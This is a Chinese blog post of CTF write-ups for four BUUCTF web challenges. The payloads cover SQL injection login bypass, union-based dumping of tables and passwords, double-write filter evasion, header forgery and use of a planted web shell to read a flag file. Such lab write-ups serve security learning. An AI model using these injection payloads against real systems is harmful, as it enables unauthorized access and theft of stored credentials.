<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[BT]BUUCTF刷题第3天（3.21） - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/4ace36cf911f2e56daff281d009100d0/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="[BT]BUUCTF刷题第3天（3.21）">
  <meta property="og:description" content="第3天（共4题） Web [极客大挑战 2019]LoveSQL Payload：/check.php?username=1&#39; union select 1,(select group_concat(password) from l0ve1ysq1),3%23&amp;amp;password=1
看到登录页面，先尝试万能密码：
用户名：1&#39; or True# 密码：123（随便输） 成功登录且获得密码加密值，但在这里无法解密，考虑其他注入(这里是联合注入)
使用?username=admin&#39; order by 数字%23&amp;amp;password=1来确定当前表的字段数，当数字设为4时报错，说明字段数为3，然后来确定回显点（%23时#的url编码，代表注释）
使用?username=1&#39; union select 1,2,3%23&amp;amp;password=1发现回显点是2和3，那么就在这两个地方返回数据
首先爆表：
?username=1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;amp;password=1 发现返回两个表，geekuser和l0ve1ysq1
然后爆字段：
?username=1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;l0ve1ysq1&#39;%23&amp;amp;password=1 最后爆内容：
?username=1&#39; union select 1,(select group_concat(password) from l0ve1ysq1),3%23&amp;amp;password=1 F12查看得到flag
[极客大挑战 2019]Http 打开网站往下滑没有找到明限突破口
F12后在最后一段文字源代码下方有一个超链接，由于onclick=&#34;return false&#34;，所以点击这段文字没有反应，这里直接访问这个文件
根据题目名字和该页面显示，分析需要构造Referer
根据后面的提示，一共需要构造：
Referer：https://Sycsecret.buuoj.cn
User-Agent：Syclover
X-Forwarded-For：localhost
即可得到flag
[极客大挑战 2019]Knife 打开网站一目了然，需要用蚁剑进行一句话木马连接，而且木马已经说明存在，打开蚁剑连接">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-21T21:02:54+08:00">
    <meta property="article:modified_time" content="2024-03-21T21:02:54+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[BT]BUUCTF刷题第3天（3.21）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="34_0"></a>第3天（共4题）</h2> 
<h3><a id="Web_1"></a>Web</h3> 
<h4><a id="_2019LoveSQL_2"></a>[极客大挑战 2019]LoveSQL</h4> 
<p>Payload：<code>/check.php?username=1' union select 1,(select group_concat(password) from l0ve1ysq1),3%23&amp;password=1</code></p> 
<p><img src="https://images2.imgbox.com/d8/b3/8Xu7djeC_o.png" alt="在这里插入图片描述"></p> 
<p>看到登录页面，先尝试万能密码：</p> 
<pre><code class="prism language-python">用户名：<span class="token number">1</span>' <span class="token keyword">or</span> <span class="token boolean">True</span><span class="token comment">#</span>
密码：<span class="token number">123</span>（随便输）
</code></pre> 
<p><img src="https://images2.imgbox.com/36/46/ZZM4SXz6_o.png" alt="在这里插入图片描述"><br> 成功登录且获得密码加密值，但在这里无法解密，考虑其他注入(这里是联合注入)</p> 
<p>使用<code>?username=admin' order by 数字%23&amp;password=1</code>来确定当前表的字段数，当数字设为4时报错，说明字段数为3，然后来确定回显点（%23时#的url编码，代表注释）</p> 
<p>使用<code>?username=1' union select 1,2,3%23&amp;password=1</code>发现回显点是2和3，那么就在这两个地方返回数据</p> 
<p><img src="https://images2.imgbox.com/f3/ca/Wa7qlkMN_o.png" alt="在这里插入图片描述"></p> 
<p>首先爆表：</p> 
<pre><code class="prism language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<p>发现返回两个表，geekuser和l0ve1ysq1<br> <img src="https://images2.imgbox.com/a5/4f/vSTu7MB5_o.png" alt="在这里插入图片描述"><br> 然后爆字段：</p> 
<pre><code class="prism language-sql">?username<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>l0ve1ysq1'<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c2/42/pXabuGRV_o.png" alt="在这里插入图片描述"><br> 最后爆内容：</p> 
<pre><code class="prism language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/9a/6e/0o1IIf8p_o.png" alt="在这里插入图片描述"><br> F12查看得到flag</p> 
<p><img src="https://images2.imgbox.com/a3/c1/6nAeREM8_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_2019Http_41"></a>[极客大挑战 2019]Http</h4> 
<p>打开网站往下滑没有找到明限突破口<br> <img src="https://images2.imgbox.com/ef/2b/SO4a0q2a_o.png" alt="在这里插入图片描述"></p> 
<p>F12后在最后一段文字源代码下方有一个超链接，由于<code>onclick="return false"</code>，所以点击这段文字没有反应，这里直接访问这个文件<br> <img src="https://images2.imgbox.com/78/48/8NTdfJ3t_o.png" alt="在这里插入图片描述"></p> 
<p>根据题目名字和该页面显示，分析需要构造Referer<br> <img src="https://images2.imgbox.com/81/85/5rNkChpb_o.png" alt="在这里插入图片描述"></p> 
<p>根据后面的提示，一共需要构造：<br> Referer：https://Sycsecret.buuoj.cn<br> User-Agent：Syclover<br> X-Forwarded-For：localhost</p> 
<p>即可得到flag<br> <img src="https://images2.imgbox.com/d0/0f/2BULwmmz_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_2019Knife_59"></a>[极客大挑战 2019]Knife</h4> 
<p><img src="https://images2.imgbox.com/5d/c6/bI7eFvfv_o.png" alt="在这里插入图片描述">打开网站一目了然，需要用蚁剑进行一句话木马连接，而且木马已经说明存在，打开蚁剑连接</p> 
<p><img src="https://images2.imgbox.com/54/b5/rICATrer_o.png" alt="在这里插入图片描述"></p> 
<p>登录终端输入<code>ls /</code>发现flag文件，<code>cat /flag</code>成功读到文件内容获取flag</p> 
<p><img src="https://images2.imgbox.com/fd/83/fuNCMR8c_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_2019BabySQL_68"></a>[极客大挑战 2019]BabySQL</h4> 
<p>Payload:<br> <code>http://0e7c833e-0882-4020-aff5-6ebe12e5ed39.node5.buuoj.cn:81/check.php?username=1' ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql%23&amp;password=1</code></p> 
<p><em>网站过滤or、select和from等关键字，由于网站只是简单的将给定数据的关键字替换成空，因此可以使用双写来达到过滤后仍是关键字的结果</em><br> <img src="https://images2.imgbox.com/26/0a/s9MmmHtU_o.png" alt="在这里插入图片描述"><br> 这里首先使用万能密码：<br> 用户名：<code>1' or 1=1%23</code><br> 密码：<code>1</code></p> 
<p>发现有错误提示，看了题解知道这里是将or关键字过滤了<br> <img src="https://images2.imgbox.com/69/7f/Lsu4rtRP_o.png" alt="在这里插入图片描述"></p> 
<p>双写测试后（?username=1’ oorr 1=1%23&amp;password=1）发现正常返回结果，接下来本题解答流程和上面几题类似，只不过要双写绕过检测<br> <img src="https://images2.imgbox.com/c4/c6/dGCgi8oo_o.png" alt="在这里插入图片描述"></p> 
<p>利用Payload：<code>http://0e7c833e-0882-4020-aff5-6ebe12e5ed39.node5.buuoj.cn:81/check.php?username=1' ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql%23&amp;password=1</code>成功拿到flag</p> 
<p><img src="https://images2.imgbox.com/8f/0c/PhNIYouO_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/bf1e5264e8a654091128112cff5c69cc/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【Java】嚼烂基础之接口</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a736088b721a815c25f8a0ac1590a5d5/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">node.js常用的命令</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>